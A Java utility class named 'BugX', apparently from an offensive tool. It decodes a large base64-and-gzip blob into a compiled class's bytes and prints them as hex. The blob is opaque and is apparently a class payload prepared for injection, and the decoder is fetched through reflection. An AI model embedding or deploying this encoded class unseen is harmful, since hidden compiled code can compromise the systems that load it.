package com.potato.potatotool.utils.data;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.zip.GZIPInputStream;

/**
 * @author Potato
 * @date 2025/7/4 04:25
 */
public class BugX {
    public static void main(String[] args) throws Exception {
        byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
        System.out.println(clazzByte.length);
        String hex = StrUtils.byteToHex(clazzByte);
        System.out.println(hex);
    }

    public static String getBase64String() throws IOException {
        return new String("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");
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])decoderClass.getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoderClass.newInstance(), new Object[]{base64Str});
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder", new Class[0]).invoke((Object)null, new Object[0]);
            return (byte[])decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{base64Str});
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }
}
